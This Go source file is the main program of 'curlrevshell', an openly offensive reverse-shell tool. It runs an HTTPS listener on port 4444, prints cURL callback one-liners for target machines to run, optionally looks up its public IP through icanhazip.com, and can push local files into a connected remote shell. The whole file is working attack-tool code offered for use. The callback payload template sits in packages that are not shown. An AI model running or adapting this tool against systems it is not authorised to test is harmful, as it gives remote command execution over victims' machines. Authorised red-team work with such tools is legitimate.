// Program curlrevshell - Even worse reverse shell, powered by cURL
package main

/*
 * curlrevshell.go
 * Even worse reverse shell, powered by cURL
 * By J. Stuart McMurray
 * Created 20240324
 * Last Modified 20241012
 */

import (
	"context"
	"errors"
	"flag"
	"fmt"
	"io"
	"log"
	"log/slog"
	"os"

	"github.com/magisterquis/curlrevshell/internal/hsrv"
	"github.com/magisterquis/curlrevshell/internal/iobroker"
	"github.com/magisterquis/curlrevshell/lib/ctxerrgroup"
	"github.com/magisterquis/curlrevshell/lib/ezicanhazip"
	"github.com/magisterquis/curlrevshell/lib/opshell"
	"github.com/magisterquis/curlrevshell/lib/shellfuncsfile"
	"github.com/magisterquis/curlrevshell/lib/sstls"
)

var (
	// Prompt is the shell prompt, settable at compile-time.  It will be
	// colored Cyan.
	Prompt = "> "
	// LogEnvVar is the environment variable we use for the default
	// logfile, which will be "" if unset.
	LogEnvVar = "CURLREVSHELL_LOG"
)

// Log messages and keys.
const (
	LKTerminating = "Program terminating"
)

func main() { os.Exit(rmain()) }
func rmain() int {
	/* Command-line flags. */
	var cbAddrs []string
	var (
		addr = flag.String(
			"listen-address",
			"0.0.0.0:4444",
			"Listen `address`",
		)
		fdir = flag.String(
			"serve-files-from",
			"",
			"Optional `directory` from which to serve "+
				"static files",
		)
		tmplf = flag.String(
			"callback-template",
			"",
			"Optional callback `template` file, used if it exists",
		)
		printDefaultTemplate = flag.Bool(
			"print-default-template",
			false,
			"Write the default template to stdout and exit",
		)
		certFile = flag.String(
			"tls-certificate-cache",
			sstls.DefaultCertFile(),
			"Optional `file` in which to cache generated "+
				"TLS certificate",
		)
		noTimestamps = flag.Bool(
			"no-timestamps",
			false,
			"Don't print timestamps",
		)
		printIPv6 = flag.Bool(
			"ipv6-one-liners",
			false,
			"Also print callback one-liners with IPv6 addresses",
		)
		useIcanhazip = flag.Bool(
			"icanhazip",
			false,
			"Query icanhazip.com for a callback address",
		)
		logFile = flag.String(
			"log",
			os.Getenv(LogEnvVar),
			"Optional `file` to which to write JSON logs",
		)
		oneShell = flag.Bool(
			hsrv.OneShellFlag,
			false,
			"Close listening socket when first shell connects",
		)
		insertFile = flag.String(
			"ctrl-i",
			"",
			"Tab/Ctrl+I's insertion `source` file or directory",
		)
		printCtrlI = flag.Bool(
			"print-ctrl-i",
			false,
			"Print what would be sent with Tab/Ctrl+I and exit",
		)
	)
	flag.StringVar(
		&Prompt,
		"prompt",
		Prompt,
		"Terminal prompt; don't forget a trailing space",
	)
	flag.Func(
		"callback-address",
		"Additional callback `address` or domain, for "+
			"one-liner printing (may be repeated)",
		func(s string) error {
			cbAddrs = append(cbAddrs, s)
			return nil
		},
	)
	flag.Usage = func() {
		fmt.Fprintf(
			os.Stderr,
			`Usage: %s [options]

Even worse reverse shell, powered by cURL.

Keyboard Shortcuts:
Ctrl+I - Insert the file or directory specified with -ctrl-i
Ctrl+J - Print locally what Ctrl+I would send
Ctrl+O - Mute output for a couple of seconds (for if you cat a huge file)
Tab    - Same as Ctrl+I

Options:
`,
			os.Args[0],
		)
		flag.PrintDefaults()
	}
	flag.Parse()

	/* If we're just printing the default template, life's easy. */
	if *printDefaultTemplate {
		if _, err := io.WriteString(
			os.Stdout,
			hsrv.DefaultTemplate,
		); nil != err {
			log.Printf("Error printing template: %s", err)
			return 1
		}
		return 0
	}

	/* Channels for comms between subsystems. */
	var (
		ich = make(chan string, 1024)
		och = make(chan opshell.CLine, 1024)
	)

	/* And an adapter betwen io.{Read,Writ}er and channels. */
	iob, err := iobroker.New(ich, och)
	if nil != err {
		log.Printf("Error setting up comms between subsystems: %s", err)
		return 3
	}

	/* Set up logging.  If we're not writing to a logfile, we'll just kinda
	discard log messages.  Beats checking for nil, anyways. */
	var lw = io.Discard
	if "" != *logFile {
		f, err := os.OpenFile(
			*logFile,
			os.O_CREATE|os.O_WRONLY|os.O_APPEND,
			0600,
		)
		if nil != err {
			log.Fatalf("Error opening logfile %s: %s",
				*logFile,
				err,
			)
		}
		defer f.Close()
		lw = f
	}
	sl := slog.New(slog.NewJSONHandler(lw, nil))

	/* Converter for Ctrl+I. */
	ctrlIConv := shellfuncsfile.NewDefaultConverter()
	ctrlIConv.AddListFunction = true
	insertGen := func() ([]byte, error) {
		/* Make sure we have something to insert. */
		if "" == *insertFile {
			return nil, errors.New("no source configured")
		}
		/* Send it for inserting. */
		b, err := ctrlIConv.From(*insertFile)
		if nil != err {
			return nil, fmt.Errorf(
				"preparing %s: %w",
				*insertFile,
				err,
			)
		}
		return b, nil
	}

	/* If we're just printing it, life's easy. */
	if *printCtrlI {
		b, err := insertGen()
		if nil != err {
			log.Fatalf("Error generating Ctrl+I file: %s", err)
		}
		os.Stdout.Write(b)
		return 0
	}

	/* Fancypants shell. */
	shell, cleanup, err := opshell.New(
		ich,
		och,
		Prompt,
		*noTimestamps,
		insertGen,
		*insertFile,
	)
	och <- opshell.CLine{Prompt: shell.WrapInColor(
		Prompt,
		opshell.ColorCyan,
	)}
	if nil != err {
		log.Fatalf("Error setting up shell: %s", err)
	}
	defer cleanup()

	/* Warn the user if the insertion file isn't there or looks empty. */
	if "" != *insertFile {
		fi, err := os.Stat(*insertFile)
		if errors.Is(err, os.ErrNotExist) {
			shell.Logf(
				opshell.ColorRed,
				false,
				"Warning: Ctrl+I file %s does not exist (yet)",
				*insertFile,
			)
		} else if nil != err {
			shell.Logf(
				opshell.ColorRed,
				false,
				"Warning: Could not get info about Ctrl+I "+
					"file %s: %s",
				*insertFile,
				err,
			)
		} else if 0 == fi.Size() {
			shell.Logf(
				opshell.ColorRed,
				false,
				"Warning: Ctrl+I file %s looks empty",
				*insertFile,
			)
		}

	}

	/* Ask icanhazip for our IP address. */
	if *useIcanhazip {
		a, err := ezicanhazip.IPv4()
		if nil != err {
			shell.Logf(
				opshell.ColorRed,
				false,
				"Error getting addresses from "+
					"icanhazip.com: %s",
				err,
			)
			return 2
		}
		cbAddrs = append(cbAddrs, a.String())
	}

	/* HTTPS Server */
	svr, err := hsrv.New(
		sl,
		*addr,
		*fdir,
		*tmplf,
		ich,
		och,
		iob,
		*certFile,
		cbAddrs,
		*printIPv6,
		*oneShell,
	)
	if nil != err {
		shell.Logf(
			opshell.ColorRed,
			false,
			"Error setting up HTTPS service: %s",
			err,
		)
		return 2
	}

	/* Start ALL the things. */
	eg, ectx := ctxerrgroup.WithContext(context.Background())
	eg.GoContext(ectx, shell.Do)
	eg.GoContext(ectx, svr.Do)
	eg.GoContext(ectx, iob.Do)

	/* Wait for something to go wrong. */
	err = eg.Wait()
	shell.SetPrompt("")
	if nil != err &&
		!errors.Is(err, io.EOF) &&
		!errors.Is(err, hsrv.ErrOneShellClosed) {
		shell.Logf(opshell.ColorRed, false, "Fatal error: %s", err)
		sl.Info(LKTerminating, hsrv.LKError, err)
		return 1
	}
	shell.Logf(opshell.ColorGreen, false, "Goodbye.")
	sl.Info(LKTerminating)

	return 0
}
